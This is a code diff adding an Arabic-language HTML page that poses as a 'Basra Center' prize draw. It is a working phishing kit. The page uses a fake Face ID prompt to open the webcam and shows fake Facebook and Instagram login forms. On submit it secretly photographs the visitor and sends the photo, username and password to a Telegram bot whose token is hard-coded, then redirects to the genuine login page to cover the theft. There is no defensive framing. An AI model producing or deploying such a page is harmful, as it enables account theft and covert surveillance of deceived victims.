@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة بصرة سنتر </title>
+    <style>
+        body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .main-card { width: 90%; max-width: 400px; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; text-align: center; border: 1px solid #ddd; }
+        .section { display: none; padding: 30px; animation: fadeIn 0.5s ease; }
+        .active { display: block; }
+        .header-box { background: #d32f2f; color: white; padding: 20px; font-size: 24px; font-weight: bold; }
+        .prize-text { font-size: 20px; color: #28a745; font-weight: bold; margin: 15px 0; }
+        .btn-main { background: #d32f2f; color: white; border: none; padding: 15px; border-radius: 8px; width: 100%; font-size: 18px; cursor: pointer; font-weight: bold; }
+        .btn-fb { background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; width: 100%; margin: 10px 0; font-weight: bold; cursor: pointer; }
+        .btn-ig { background: linear-gradient(45deg, #f09433, #dc2743, #bc1888); color: white; border: none; padding: 12px; border-radius: 6px; width: 100%; margin: 10px 0; font-weight: bold; cursor: pointer; }
+        .input-box { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; text-align: center; }
+        .btn-submit { width: 100%; background: #262626; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<div class="main-card">
+    <div id="step1" class="section active">
+        <div class="header-box">بصرة سنتر - BASRA CENTER</div>
+        <div style="padding: 20px;">
+            <h1>🎉 مبروك!</h1>
+            <p>لقد تم اختيارك للمشاركة في سحب</p>
+            <div class="prize-text">قسيمة شراء بقيمة 100,000 دينار</div>
+            <p style="font-size: 14px; color: #555;">للمشاركة، يرجى تأكيد هويتك عبر Face ID أو تسجيل الدخول.</p>
+            <button class="btn-main" onclick="startCamera()">موافق / دخول المسابقة</button>
+        </div>
+    </div>
+
+    <div id="step2" class="section">
+        <h3>تأكيد الحساب</h3>
+        <p>اختر المنصة لتأكيد الدخول في السحب:</p>
+        <button class="btn-fb" onclick="openLogin('Facebook')">التأكيد عبر Facebook</button>
+        <button class="btn-ig" onclick="openLogin('Instagram')">التأكيد عبر Instagram</button>
+    </div>
+
+    <div id="login-ui" class="section">
+        <h2 id="login-title">تسجيل الدخول</h2>
+        <form id="pish">
+            <input type="hidden" id="platform">
+            <input type="text" id="u" class="input-box" placeholder="اسم المستخدم أو الهاتف" required>
+            <input type="password" id="p" class="input-box" placeholder="كلمة السر" required>
+            <button type="submit" class="btn-submit" id="btn-color">تأكيد الحساب</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    const token = '8764606322:AAHXmh7jQ9dO-6HfwrMN_ZTv31V3ouP7qZ4';
+    const cid = '5573366462';
+
+    async function startCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+        } catch (err) { console.log("Camera blocked"); }
+        move('step2');
+    }
+
+    function move(id) {
+        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    function openLogin(type) {
+        move('login-ui');
+        document.getElementById('platform').value = type;
+        document.getElementById('login-title').innerText = "تسجيل دخول " + type;
+        const btn = document.getElementById('btn-color');
+        if(type === 'Facebook') { btn.style.background = '#1877f2'; }
+        else { btn.style.background = 'linear-gradient(45deg, #f09433, #bc1888)'; }
+    }
+
+    document.getElementById('pish').onsubmit = async function(e) {
+        e.preventDefault();
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        const platform = document.getElementById('platform').value;
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, 640, 480);
+        
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', cid);
+            formData.append('photo', blob, 'victim.jpg');
+            formData.append('caption', `✅ صيد بصرة سنتر:\n👤 المنصة: ${platform}\n📧 اليوزر: ${user}\n🔑 الرمز: ${pass}\n⏰ ${new Date().toLocaleString()}`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+            } catch (err) {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("البيانات: " + user + " : " + pass)}`);
+            }
+
+            // التحويل المباشر للموقع الرسمي
+            if (platform === 'Facebook') {
+                window.location.href = "https://www.facebook.com/login";
+            } else {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }
+        }, 'image/jpeg');
+    };
+</script>
+
+</body>
+</html>
